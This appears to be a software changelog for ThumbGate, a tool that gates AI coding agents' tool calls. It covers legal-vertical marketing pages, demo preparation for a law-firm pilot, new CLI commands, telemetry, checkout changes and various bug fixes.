- cf6d835: docs(readme): cross-link to mac-yolo-safeguards as the OS-layer companion kit. ThumbGate handles token-layer governance (block repeated mistakes via thumbs-down). mac-yolo-safeguards handles OS-layer blast-radius (prevent Mac freeze when agents spawn runaway processes). Same author, both MIT, both no-telemetry. UTM-tagged to attribute click-through in mac-yolo-safeguards's GitHub traffic.
- ed15f97: Fix /dashboard demo path that silently halted on undefined globals. Adds a TG_TOKEN_SAVINGS browser shim (mirrors scripts/token-savings.js), a defensive renderTopBlockedGates stub, and `typeof Chart === 'undefined'` guards on the three chart renderers so missing chart.js CDN never breaks the demo. Production was affected — unit tests check static HTML only and the existing e2e tests use ?noauto, which bypassed loadDemo() entirely.
- d19582a: docs: minute-by-minute Greenberg Traurig demo script appended to implementation-notes memo

  Appends a time-blocked speaking script to `.claude/implementation-notes/2026-05-28-gt-meeting.md` so Igor opens one file at 2:55pm and runs the 30-minute demo on autopilot.

  Contents: 90-second Sullivan & Cromwell opener (verbatim), three live-demo walkthrough scripts with exact paste-text and click sequences, four-minute "why this is different" segment, five-minute pilot-mechanics ask, two-minute procurement-pack handoff, Q&A with three pre-baked verbatim ≤50-word answers, the post-call recap email template, and a "things to NOT do during the demo" checklist.

  No public-surface change. Pure docs.

- e63364b: site: add live UPL / Conflict / Egress gate simulators to the Legal AI page

  Three interactive simulators on `/ai-malpractice-prevention`:

  - UPL Gate: detects advice-shaped output from non-attorney sources, shows the corrective hand-off and full audit log.
  - Conflict Gate: cross-references a party name against a sample adverse-parties list with realistic block/clear results.
  - Egress Gate: detects privilege markers in outbound payloads and shows the in-tenant LLM redirect.

  All three use the same deterministic PreToolUse logic that runs in production — no LLM calls on the enforcement path. Gives law-firm pilot prospects a hands-on "this is what protection actually feels like" moment during the walkthrough.

  Re-implements the value of PR #2292 on top of current main (the original branch was 4 days behind and would have regressed the page's recent SEO + copy work).

- ed15f97: Greenberg Traurig walkthrough prep: legal-intake gate patterns now case-insensitive on "[Yy]ou should file..." UPL phrasing and accept both "missing disclaimer" and "disclaimer=missing" orderings. Dashboard demo persona updated to "Jamie M., Partner · Litigation Intake" and forecast figures rescaled to BigLaw-pilot credibility ($84K booked + $32K incremental). Adds pattern-proof and zero-egress-proof scripts plus 25-minute talk track under docs/demo/.
- 6846e6d: Harden the Greenberg Traurig walkthrough proof by making the zero-egress demo script use a reliable env-var-backed Node invocation and aligning the internal call script with the live legal AI governance pilot offer.
- 5ea6d90: Expose the Pro checkout path above the fold on the homepage and emit canonical revenue analytics for paid CTA clicks.
- 8b54490: site: `/learn/ac-dc-runtime-enforcement` — plug ThumbGate into Sonar's AC/DC framework

  Sonar published the Agent Centric Development Cycle (**AC/DC** — Guide → Generate → Verify → Solve) earlier this year and The New Stack covered it as the framework engineering leaders should reach for when adopting AI coding agents at scale. The framework is real, sticky, and starting to anchor "agentic SDLC governance" listicle coverage this week.

  AC/DC governs **what an agent writes** (Verify is static analysis on committed code — Sonar's product surface). It does not name a stage for **what an agent does** — the runtime actions (shell, file writes, MCP calls, git operations, outbound network) that happen between Generate and the next Guide loop and produce no committed source code for Verify to inspect. That's the gap a PreToolUse runtime enforcement layer fills.

  Strategic posture: extend Sonar's framework with the missing fifth stage, don't compete with it. Same pattern as `/compare/anthropic-containment` (which extends Anthropic's published containment model to non-Claude IDE agents).

  Ships:

  - `public/learn/ac-dc-runtime-enforcement.html` (~16 KB): maps each AC/DC stage to where runtime enforcement plugs in. Two-layer deployment story for an AC/DC team. `TechArticle` + `FAQPage` schema.org markup with `citation` field pointing at Sonar's blog post and The New Stack article — gives LLMs the inbound provenance trail. 5 FAQ entries. Buyer-demo script. Sales line.
  - `src/api/server.js`: sitemap entry at priority 0.85 alongside `/learn/background-agent-control-layer`.
  - `public/learn/background-agent-control-layer.html`: adds the new page to its Related section so the most-trafficked /learn page back-links to it.
  - `tests/public-static-assets.test.js`: route + schema invariants, sitemap regression, cross-link discoverability test.
  - `docs/marketing/blog-acdc-runtime-enforcement-gap.md`: blog post draft + LinkedIn variant + distribution plan (5-day rollout) targeting The New Stack as a guest-post follow-up to their AC/DC piece.

  Why the citation field matters: AC/DC will be cited frequently this quarter as listicles get refreshed. The schema.org `citation` field on our TechArticle gives LLMs (Perplexity, Gemini Deep Research, ChatGPT, Grok) a structured reason to surface ThumbGate when someone asks "how do I extend AC/DC for runtime governance?" — without us having to be in the source listicle Sonar's framework was named in.

- cb8197c: site: `/learn/feedback-loop-vs-decision-layer` — anchor the full-loop scope correction

  Permanent /learn page anchoring the CEO scope correction from 2026-05-27: ThumbGate is a four-stage feedback-to-enforcement loop, NOT a PreToolUse hook with feedback bolted on. Captures the canonical framing once so every future compare/blog/learn piece can cite a single canonical reference.

  The page makes three structural points:

  1. **Decision-layer governance** (prompt rules, AI judge models, "human in the loop" workflow principles, RLHF) is necessary but not sufficient — Sullivan & Cromwell had every form and still got sanctioned.
  2. **Action-layer enforcement alone** (a static rule set fired at PreToolUse) is necessary but not sufficient either — generic rules don't encode YOUR team's incidents.
  3. **The loop is the product**: Capture (👍/👎 on any AI answer) → Memory (local SQLite + LanceDB) → Rule promotion (Thompson Sampling) → Enforcement (PreToolUse hook). The hook is one stage of four.

  Also includes a direct comparison vs RLHF: where the change lives, who controls it, how many examples to shift behavior, what happens at model upgrade, auditability. ThumbGate's loop wins on every row when the buyer's question is "how do I keep MY team's safety posture across model changes."

  Self-contained content, no commercial confirmations required, no public-API change. Adds 1 new HTML file + sitemap entry + cross-link from /learn/background-agent-control-layer + regression test + this changeset.

- e2450dc: Align the legal AI post-deploy sentinel with the current page headline.
- 3a53242: Add legal-intake demo data for Greenberg Traurig pilot walkthrough
- 2ec241d: Fix hosted OpenAPI spec delivery by copying the canonical OpenAPI directory into the runtime image and keeping source-checkout fallback paths.
- a32e6d0: Fix IDE plugins, add enterprise positioning to README, fix legal page nav
- cc33735: Add customer-scoped Pro lesson sync endpoints and CLI push/pull commands.
- 47cf930: Tighten Free limits and reposition CLI upgrade prompts around hosted Pro sync across machines, CI, containers, and agent runtimes.
- 5f5f255: Tighten free-to-paid conversion boundaries, add first-party visitor journey summaries to the operator telemetry export, and strengthen AI-search discovery metadata.
- fcee825: Add a manual revenue truth audit workflow and tighten the homepage offer router so buyers can choose Pro, workflow intake, or free evaluation without CTA overload.
- f0411a6: site: `/ai-malpractice-prevention` Sullivan & Cromwell opener + Greenberg Traurig procurement pack skeleton

  Last-mile demo prep before the 2026-05-28 3pm Greenberg Traurig pilot meeting with Matt Beekhuizen (Chief Pricing & Innovation Officer). Two items the demo-research memo flagged as `<12-hour HIGH priority`:

  1. **Above-the-fold "Why this matters now" callout on `/ai-malpractice-prevention`** — amber-bordered banner citing the canonical 2026 legal-AI hallucination incident: Sullivan & Cromwell apologized to a federal judge for AI-hallucinated citations **despite** policies, mandatory training, and verification requirements. Gordon Rees same problem on a bankruptcy filing. Damien Charlotin's public database now catalogs **1,369+ rulings**. Anchor sentence: _"The firms with policies still got sanctioned. Policies are not enforcement. A runtime gate is."_ This pre-empts the dominant 2026 buyer objection ("we have policies already") in 60 seconds.

  2. **`docs/marketing/greenberg-traurig-procurement-qa.md`** — 10-question procurement Q&A skeleton with explicit `[CEO TO CONFIRM]` placeholders for SOC 2 status, BAA capability, IP/hallucination indemnification, pilot pricing, post-pilot pricing. Verified-answer language drafted for data retention, DPIA template (EU AI Act), 90-day audit-log evidence (citing the downloadable audit JSON shipped in PR #2349), and sandbox-without-gatekeeper. The file intentionally stays a docs/ file (not a public surface) until CEO resolves the commercial placeholders.

  No public-API or behavior change. The S&C callout is content-only (HTML insertion into existing `<header class="hero">`). The procurement Q&A is a docs file with no route or sitemap entry.

## 1.23.1

### Patch Changes

- [#2313](https://github.com/IgorGanapolsky/ThumbGate/pull/2313) [`6c2647d`](https://github.com/IgorGanapolsky/ThumbGate/commit/6c2647dbc93d9f4c6823e0debd759f7c2e1ce02b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add CLI value receipts after feedback capture and stats so installers see stored proof, next proof commands, and tracked Pro or Team upgrade paths at the moment value is created.

- [#2297](https://github.com/IgorGanapolsky/ThumbGate/pull/2297) [`a127dc6`](https://github.com/IgorGanapolsky/ThumbGate/commit/a127dc6df11589ecf2bc7ed23ece618ac1d1f566) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Position ThumbGate as deterministic, inspectable prevention instead of black-box native thumbs or vendor memory, and update the Pro buyer path with audit-loop proof copy.

- [#2296](https://github.com/IgorGanapolsky/ThumbGate/pull/2296) [`6da4d87`](https://github.com/IgorGanapolsky/ThumbGate/commit/6da4d876708f01b0009fcc4ec4a3255ce431e177) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Tighten the law-firm AI intake pilot page with a visual control-flow asset and add the route to post-deploy marketing verification.

- [#2313](https://github.com/IgorGanapolsky/ThumbGate/pull/2313) [`6c2647d`](https://github.com/IgorGanapolsky/ThumbGate/commit/6c2647dbc93d9f4c6823e0debd759f7c2e1ce02b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Sharpen the legal AI pilot page for law-firm innovation and risk buyers with conservative pre-execution-control positioning, preloaded ground-truth pilot inputs, and a 25-minute walkthrough CTA.

- [#2295](https://github.com/IgorGanapolsky/ThumbGate/pull/2295) [`ce44ea6`](https://github.com/IgorGanapolsky/ThumbGate/commit/ce44ea60db4e6421dd83c50effd347982d95c7e1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Sharpen the law-firm AI intake pilot page with safer buyer-facing governance language, preloaded rule-pack positioning, demo storyboard, and meeting agenda for enterprise legal innovation review.

## 1.23.0

### Minor Changes

- [#2282](https://github.com/IgorGanapolsky/ThumbGate/pull/2282) [`47d2d6c`](https://github.com/IgorGanapolsky/ThumbGate/commit/47d2d6c5f63fea7165640f724755bd5c16746dc7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(landing): `/agents-cost-savings` — FinOps-for-AI positioning page

  New marketing surface positioning ThumbGate as the _prevention_ layer for
  AI agent spend, distinct from the _reporting_ layer that Finout, Helicone,
  Vantage, and the new "AI FinOps Assistant" wave occupy.

  The page anchors on a real number (the output of the new `thumbgate cost`
  CLI shipped alongside) and a prevention-vs-reporting comparison table.
  Composes with `/codex-enterprise` (the Dell-distribution landing) and
  `/agent-manager` (the role-level framing) as a three-page enterprise
  positioning surface.

  - New file: `public/agents-cost-savings.html`
  - Route: `/agents-cost-savings` + `/agents-cost-savings.html` via
    `servePublicMarketingPage` (UTM attribution + `pageType: agents_cost_savings` telemetry)
  - Sitemap entry at priority 0.85
  - 3 new route/HEAD/sitemap tests in `tests/public-static-assets.test.js`
  - Added to `package.json` `files` whitelist so it ships with the npm bundle

  Honest scope: this is SEO + reply-to-pitch positioning, not a feature.
  Won't generate revenue tomorrow. Will give ThumbGate-curious buyers who
  get a Finout / Helicone email a frame for "we prevent, they report."

- [#2291](https://github.com/IgorGanapolsky/ThumbGate/pull/2291) [`1968ed1`](https://github.com/IgorGanapolsky/ThumbGate/commit/1968ed1eed44e43909c34b3b84ea2bd46225f619) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(landing): /ai-malpractice-prevention — legal-vertical positioning page

  New marketing surface positioning ThumbGate for law firms specifically.
  Built 2026-05-21 in response to a warm-lead conversation with Greenberg
  Traurig (Matt Beekhuizen, Chief Pricing & Innovation Officer; demo 2026-05-28).

  The page covers the three failure modes ThumbGate prevents in legal:

  - **Unauthorized practice of law** (Rule 5.5) — AI intake bot giving
    outcome-shaped responses
  - **Missed conflicts** (Rules 1.7/1.9/1.10) — adverse-party cross-matter
    contamination
  - **Privilege breach** (Rule 1.6) — privileged content sent to non-approved
    LLM processors

  Plus a compliance map to ABA Formal Op. 512 (Jul 2024), three concrete
  scenarios with before/after framing, the on-prem/in-tenant deployment
  story, and CPO-flavored framing on AFA reserve cost (the pricing-function
  angle that resonates with Innovation/Pricing buyers inside firms, not
  just GCs).

  Reusable for any law-firm outreach — written in operator vocabulary
  (vetting overhead, tool heterogeneity, reserve cost) rather than
  Model-Rule-grandstand vocabulary, so it lands with the Chief Pricing &
  Innovation Officer who's actually the buyer at most firms.

  Changes:

  - `public/ai-malpractice-prevention.html` (~290 LOC)
  - `src/api/server.js` — route + sitemap entry at priority 0.9 (highest
    single page — legal-vertical TAM is large)
  - `package.json` — added to files whitelist
  - `tests/public-static-assets.test.js` — +3 route/HEAD/sitemap tests
    with content assertions (UPL, privilege, conflict, ABA Formal Op
    locked in)
  - `tests/package-boundary.test.js`, `tests/public-bundle-ratchet.test.js`,
    `tests/public-core-boundary.test.js` — sister-bumped file ratchet
    261 → 262

  Companion private materials (NOT shipped):

  - `.thumbgate/sales/2026-05-28-greenberg-traurig-prep.md` — demo
    prep, applies Voss + Camp negotiation frameworks
  - `.thumbgate/sales/demo-script-greenberg-traurig.md` — minute-by-minute
    demo flow

- [#2281](https://github.com/IgorGanapolsky/ThumbGate/pull/2281) [`5bd341c`](https://github.com/IgorGanapolsky/ThumbGate/commit/5bd341cc673575cb4f143e45d91bfb33f4eb3272) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(cli): add `thumbgate cost` to surface $ saved by gate blocks

  Wires the existing `scripts/token-savings.js` (already used by the
  dashboard) into a CLI subcommand so users can see — in plain dollars —
  what their PreToolUse gates are worth without leaving the terminal.

  ```
  $ thumbgate cost

  💰 ThumbGate cost-savings — cumulative
  ──────────────────────────────────────────────────
    Tool calls blocked : 247
    Tool calls warned  : 12
    Tool calls passed  : 3,401
    Top blocker        : no-mocked-db (138 blocks)

    Tokens you did NOT spend
      Input  : 494K
      Output : 148K
      Total  : 642K

    Estimated $ saved  : $3.95
  ```

  Flags: `--json` for machine output, `--stats <path>` to point at a
  non-default `gate-stats.json`, `--mix <json>` to override the Sonnet-heavy
  default model blend. Aliased as `savings` and `costs`.

  Positioning: the 2026 wave of "FinOps for AI agents" tools (Finout, etc.)
  _reports_ on agent spend. ThumbGate _prevents_ it. This subcommand makes
  that value visible in dollars to the operator without integrating a
  separate FinOps platform.

  10 unit tests in `tests/cost-cli.test.js` cover arg parsing, missing/present
  stats files, the no-data friendly message, and top-blocker selection.

- [#2279](https://github.com/IgorGanapolsky/ThumbGate/pull/2279) [`e19b393`](https://github.com/IgorGanapolsky/ThumbGate/commit/e19b393abb2cda92c3c60639a23fde0e16ea0ed9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(gates-engine): free-tier daily block cap (10/day) — deny → warn + upgrade CTA after limit
  feat(gates-engine): Pro CTA in deny output after 5+ total blocks
  feat(cli): `thumbgate trial` command showing trial status + upgrade path
  feat(cli): global --help interceptor for 14 subcommands
  feat(cli): UTM-tracked checkout URLs + improved limitNudge with usage context
  feat(telemetry): sessionId + clientType in CLI pings for user-level analytics
  feat(server): active user metrics (activeInstalls, uniqueSessions) on /v1/metrics/real

### Patch Changes

- [#2283](https://github.com/IgorGanapolsky/ThumbGate/pull/2283) [`1bccc2c`](https://github.com/IgorGanapolsky/ThumbGate/commit/1bccc2c60845f207a4d1c8ff1af914d34c0ac49c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(site): broken link audit — correct llm-context.md paths in 43 HTML files, fix dead pricing anchor, add 404 catch-all, add /go/team /go/checkout /go/trial shortlinks

- [#2293](https://github.com/IgorGanapolsky/ThumbGate/pull/2293) [`5c4e0eb`](https://github.com/IgorGanapolsky/ThumbGate/commit/5c4e0eb1a507fb1163182bfe00a07f97a90dc830) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add first-party telemetry counters for ThumbGate GPT Action calls so ChatGPT usage can be measured separately from GPT link opens.

- [#2287](https://github.com/IgorGanapolsky/ThumbGate/pull/2287) [`a15f8c1`](https://github.com/IgorGanapolsky/ThumbGate/commit/a15f8c1cf3fa6991b0670e62ea0a2f1977ccc7cd) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(checkout): add email capture to checkout interstitial

  The checkout interstitial now collects the visitor's email before
  redirecting to Stripe Checkout. Previously the "Pay $19/mo" button was
  a plain anchor — visitors who abandoned Stripe were lost with no way to
  follow up. The form pre-fills the Stripe receipt email and fires a
  telemetry beacon on submit so the email is captured even if the visitor
  never completes payment.

  Side-effect: the confirm=1 trigger moved from a crawlable `<a>` to a
  `<form>` hidden input, which is inherently bot-safe (crawlers don't
  submit forms) and eliminates the zombie-session vector more cleanly than
  the previous `rel="nofollow"` approach.

- [#2278](https://github.com/IgorGanapolsky/ThumbGate/pull/2278) [`9981fd3`](https://github.com/IgorGanapolsky/ThumbGate/commit/9981fd37a329bfc9c9a724e37390db182db1a795) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(tests): respect `HOME`/`USERPROFILE` env-override in `scripts/pro-local-dashboard.js`

  `isCreatorDev`, `hasDevOverride`, `getLicenseDir`, and `getLicensePath` now
  fall back to `process.env.HOME || process.env.USERPROFILE || os.homedir()`
  instead of jumping straight to `os.homedir()`. This means tests that try to
  isolate filesystem state by setting `HOME` to a tmpdir actually get isolated
  — previously the dev-bypass / license-path lookups silently used the
  developer's real home directory and pulled in local config, causing
  "passes locally / flakes in CI" failures in `tests/cli.test.js`.

  Companion test change: `tests/cli.test.js` adds `THUMBGATE_DEV_SECRET`,
  `THUMBGATE_DEV_BYPASS`, and `THUMBGATE_DEV_KEY` to the env-isolation list
  so developer dev-mode bypasses can't leak into the test runtime either.

  No behavior change for end users — purely tightens test isolation around
  the existing dev-mode escape hatches.

- [#2286](https://github.com/IgorGanapolsky/ThumbGate/pull/2286) [`6ee6386`](https://github.com/IgorGanapolsky/ThumbGate/commit/6ee63863f258a68dd2e852bf9631fb1a40b0f7f1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(api): /health no longer kills the container over a missing buildSha

  The /health endpoint previously returned HTTP 503 if any of three checks
  failed — including a missing `BUILD_METADATA.buildSha`. Railway treats
  503 as a healthcheck failure → sends SIGTERM → container exits →
  restart-policy budget exhausts → outage.

  This exact failure mode took prod down 2026-05-21 18:21Z → 19:30Z
  (~70 min) after the THUMBGATE_BUILD_SHA env var was cleaned up earlier
  in the day. A telemetry gap is not a service outage; the container still
  serves requests fine when buildSha is empty.

  Tiered failure classification:

  - **service-failing** (feedback dir unwritable, hosted-config appOrigin
    missing) → HTTP 503 + status: 'failing'. Container should be replaced.
  - **telemetry-degraded** (buildSha missing) → HTTP 200 + status: 'degraded'
    - `degraded: true` flag. Container stays alive; monitors see the gap.

  Every check now carries a `severity` field so downstream monitors can
  distinguish the two classes. Response shape is backwards-compatible
  (adds `degraded` and `severity` fields; existing consumers ignore them).

  Regression test pins the new behavior: a missing build-metadata file
  must return 200 (not 503) and must set status='degraded'.

- [#2280](https://github.com/IgorGanapolsky/ThumbGate/pull/2280) [`7b65511`](https://github.com/IgorGanapolsky/ThumbGate/commit/7b65511973ea2474d1cb0a93edb4bc5e484671c7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(landing): replace broken 90-second demo link with honest CTA

  The hero "Watch the 90-second demo" anchor on `/` pointed to `#demo`,
  which scrolled to a section that no longer hosts a video — the link
  landed visitors on an empty placeholder. Replace with an honest CTA
  that directs to a real, available surface so the landing-page promise
  matches what's actually there. Companion E2E coverage updated in
  `tests/e2e/index-page-clickability.spec.js`.

- [#2293](https://github.com/IgorGanapolsky/ThumbGate/pull/2293) [`5c4e0eb`](https://github.com/IgorGanapolsky/ThumbGate/commit/5c4e0eb1a507fb1163182bfe00a07f97a90dc830) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Ship the self-healing health-check runtime in the npm package so `thumbgate self-heal` works from published installs.

- [#2293](https://github.com/IgorGanapolsky/ThumbGate/pull/2293) [`5c4e0eb`](https://github.com/IgorGanapolsky/ThumbGate/commit/5c4e0eb1a507fb1163182bfe00a07f97a90dc830) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Ship `scripts/silent-failure-cluster.js` in the npm package so the experimental `THUMBGATE_SILENT_FAILURE_CLUSTERING=1` meta-agent lane works from published installs, not only source checkouts.

- [#2285](https://github.com/IgorGanapolsky/ThumbGate/pull/2285) [`baef4ec`](https://github.com/IgorGanapolsky/ThumbGate/commit/baef4ec5947041561ca29bc40615f5059064abe4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(ul): silent-failure clustering as a candidate source for meta-agent-loop (experimental, off by default)

  New module `scripts/silent-failure-cluster.js` mines failed tool calls (exit_code != 0 or matching the existing `ERROR_PATTERNS`) from the JSONL conversation logs, excludes any failure within ±5 min of a feedback-log entry (already in the HITL loop), normalizes paths and redacts secrets in args, then clusters by `(tool, normalized-arg-signature)` with a min cluster size of 3. Each cluster is emitted as a candidate prevention rule tagged `origin: 'silent-failure-cluster'` and flows through the EXISTING `meta-agent-loop.js` hit-rate / fp-rate scoring — no guardrail is bypassed.

  **Experimental — off by default.** Enable with `THUMBGATE_SILENT_FAILURE_CLUSTERING=1`. Pre-existing behavior is unchanged when the flag is unset. Only useful on workspaces generating ≥ 50 tool calls/day; below that threshold the module skips cleanly with `skippedReason: 'insufficient-data'`. No new npm dependencies.

## 1.22.0

### Minor Changes

- [#2146](https://github.com/IgorGanapolsky/ThumbGate/pull/2146) [`8fd9a3f`](https://github.com/IgorGanapolsky/ThumbGate/commit/8fd9a3f80a4e01b6562dfc741cfb2e8265ab4faf) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Adds the `adapters/xai-grok/` directory documenting that ThumbGate works on xAI's **Grok Build CLI** (launched May 14, 2026) with **zero new configuration**. Grok Build deliberately adopted Claude Code's conventions — it auto-detects AGENTS.md / CLAUDE.md, MCP servers, hooks, and Anthropic Skills format on launch. The existing `adapters/claude/.mcp.json` works unchanged.

  The new `adapters/xai-grok/README.md` documents:

  - What Grok Build is + which conventions it adopted
  - How to wire ThumbGate (use the existing Claude config; nothing new needed)
  - What ThumbGate surfaces Grok Build picks up (MCP server, PreToolUse hook, CLAUDE.md rules, Skills, gate-check feedback)
  - Verification steps via Grok Build's `/mcps` / `/hooks` / `/skills` modals
  - **Explicit "not yet end-to-end verified"** caveat — SuperGrok Heavy access is gated behind their tier. Honest framing pending operator verification with screenshots from the inspect modal.

  Also: `adapters/README.md` gains the xai-grok line in the adapter matrix.

  Holding the landing-page agent-compatibility list update until an operator confirms end-to-end with screenshots. Per CLAUDE.md Honesty Protocol, "works on Grok Build" as a marketing claim needs proof, not just upstream-convention compatibility.

- [#2187](https://github.com/IgorGanapolsky/ThumbGate/pull/2187) [`92f8e4b`](https://github.com/IgorGanapolsky/ThumbGate/commit/92f8e4b171ab75847f24e78efa139da7a71db95c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Claim the "Agent Manager" role as our ICP, after Anthropic publicly named it (per @dani_avila7's thread). Three changes:

  1. **`public/agent-manager.html` — new ICP landing page.** Direct address to the role Anthropic named — hybrid PM/engineer DRI who owns CLAUDE.md hierarchy, the plugin marketplace, permissions policy, and which skills ship. Includes a five-row mapping table from "what the Agent Manager owns" to "what ThumbGate ships for each," the three-phase rollout pattern with where we fit, and CTAs into the existing Workflow Hardening Sprint intake and Pro checkout.

  2. **`src/api/server.js`** — dedicated `/agent-manager` (and `/agent-manager.html`) route. Routed through `servePublicMarketingPage` so thread arrivals from X/Bluesky/LinkedIn capture UTM attribution and `landing_page_view` telemetry with `pageType: 'agent_manager'`.

  3. **`public/index.html`** — small addition to the existing ICP link row (Compare / Platform / Regulated): "Built for the Agent Manager →". Zero layout risk, claims the SEO term while search volume is being created.

  Reply draft to @dani_avila7 was appended to `.thumbgate/reply-drafts.jsonl` (gitignored, draft-only per CLAUDE.md social policy). CEO review required before posting.

- [#2235](https://github.com/IgorGanapolsky/ThumbGate/pull/2235) [`33e45aa`](https://github.com/IgorGanapolsky/ThumbGate/commit/33e45aaf23ef16e5471045f686d87333a68db8c3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add the `thumbgate audit` command — the AI Bill Auditor.

  `thumbgate audit <transcript>` scans an agent session transcript for repeat-mistake patterns (force-push retry loops, hallucinated-import retries, apology/reasoning-reset cycles) and reports the estimated token waste each pattern costs. It is the diagnostic wedge for the "Repeat Tax" — the recurring spend ThumbGate's gates exist to eliminate.

  Ships `scripts/audit.js` (the heuristic engine, `runAudit()`), wires the `audit` command into the CLI switch and the `cli-schema.js` command registry, and bumps the public-bundle ratchet baseline 258 → 259 for the one new bundled file.

- [#2139](https://github.com/IgorGanapolsky/ThumbGate/pull/2139) [`bf964cf`](https://github.com/IgorGanapolsky/ThumbGate/commit/bf964cff93573b28865e15ee2763eda002447bdb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Adds the `/broker-audit` public landing page route serving `src/api/static/broker-audit.html` — the wedge surface for the real-estate broker cold-outreach campaign.

  The route serves a free-audit-primary, $49-fast-lane-secondary funnel that matches the offer in the in-flight 65-broker cold email batch. Trust signals (refund language, no-call-required, response-time SLA) ride above the fold; the $49 Stripe link routes to a verified payment_link on the Saas Growth Dispatch account with `after_completion` → `/success`.

  Cleanly scoped: only `src/api/server.js` (+19 lines for the route handler) and the new static file. No other routes touched. Plays alongside existing `/checkout/pro` and `/pricing` paths without modification.

- [#2125](https://github.com/IgorGanapolsky/ThumbGate/pull/2125) [`2bffd3a`](https://github.com/IgorGanapolsky/ThumbGate/commit/2bffd3a6b92f40f97cfec905c96fc2d398191b28) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bumps `protobufjs` from 7.5.6 to 8.3.0. This is a major version bump upstream (7.x to 8.x) and may include breaking changes to the protobufjs API surface. ThumbGate's usage should be re-verified against the v8 changelog. Lockfile-only change at the dependency level; downstream consumers should treat this as a notable upgrade.

- [#2067](https://github.com/IgorGanapolsky/ThumbGate/pull/2067) [`c0faeea`](https://github.com/IgorGanapolsky/ThumbGate/commit/c0faeeaa5c76a06ec0d9a2f73e5cc27e87c9c27d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `/case-studies` public surface — first proof page for thumbgate.ai. Until now visitors landed on CLI install commands with zero evidence that anyone actually got value from the product. First entry is the Aiventyx Teams integration: real third-party CTR signal (62%, 5 clicks on 8 views), concrete fix description (added `teams` to `TRACKED_LINK_TARGETS`), and verification quote from the partner's own incognito test. Live `/go/teams?utm_source=case-study` link lets buyers reproduce the redirect themselves. Cross-links to /pricing/, /privacy/, /terms/, /support/ make this a buyer-trust hub.

- [#2077](https://github.com/IgorGanapolsky/ThumbGate/pull/2077) [`22b5e71`](https://github.com/IgorGanapolsky/ThumbGate/commit/22b5e71b10069203a31fc158b684c836002bb555) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `/compare/heidi` deep-dive page positioning ThumbGate as the behavior-enforcement layer (PreToolUse hook + lesson DB) next to Meterian's HEIDI as the supply-chain layer (manifest scanning + MCP-served vuln data). Honest framing: not a competitor, complementary stack. Adds a third comparison card on `/compare` linking to the page. Both tools are free at base, both local-first, run on the same machine without conflict. Pre-empts the buyer confusion that will land when "AI coding security" googlers see both products on the same search-result page.

- [#2083](https://github.com/IgorGanapolsky/ThumbGate/pull/2083) [`bc32720`](https://github.com/IgorGanapolsky/ThumbGate/commit/bc32720f8e9a01ccbaabef62e834da4b4293f451) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `scripts/eval_gate_classifier.py` — the first end-to-end ML pipeline in the repo. Loads `.thumbgate/feedback-log.jsonl`, builds features (TF-IDF on context + bag-of-tags + bag-of-categories), stratified train/test split, fits `LogisticRegression(class_weight='balanced')`, scores precision/recall/F1 (per-class + macro), ROC-AUC, PR-AUC, and full `classification_report`, then serializes the fitted pipeline with `joblib.dump` and writes a metrics card to `<feedback-dir>/eval/`. Run via `npm run eval:classifier`. sklearn / joblib / scipy are intentionally NOT runtime deps of the npm package — install via `pip install scikit-learn joblib` to enable. Pinned by `tests/eval-gate-classifier.test.js` (skips gracefully if sklearn isn't installed in CI).

- [#2142](https://github.com/IgorGanapolsky/ThumbGate/pull/2142) [`439b57f`](https://github.com/IgorGanapolsky/ThumbGate/commit/439b57f1d03d6e83250e96d7732403f486954c22) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - **Fix: `hook-auto-capture` crashed with `MODULE_NOT_FOUND` in published thumbgate@1.19.0.**

  `scripts/cli-feedback.js` did an unconditional `require('./history-distiller')`. But `history-distiller.js` is a `PRIVATE_CORE_MODULE` — present in the source checkout and in `ThumbGate-Core`, but intentionally excluded from the public npm tarball (see `tests/public-package-boundary.test.js`). When a published install ran the Claude Code `UserPromptSubmit` hook (`hook-auto-capture`), the `require` chain reached `cli-feedback.js`, hit the missing `history-distiller`, and threw — meaning every `thumbs up:` / `thumbs down:` typed in a hooked agent was silently dropped.

  Fix: switched the require to `loadOptionalModule('./history-distiller', () => ({ distillFromHistory: () => null }))`, matching the pattern already in use by `scripts/feedback-loop.js` and `src/api/server.js`. The caller in `processInlineFeedback` already handles `distillResult === null` gracefully, so the public-shell state degrades cleanly: feedback is still captured, distillation is skipped.

  Regression test in `tests/public-package-boundary.test.js#cli-feedback loads and runs in public-tarball state` forces the public-shell state via the existing `withBoundaryFallbackModule` helper and asserts `processInlineFeedback` returns a feedback record with `distillResult` either null or an object. This locks the bug class for cli-feedback.

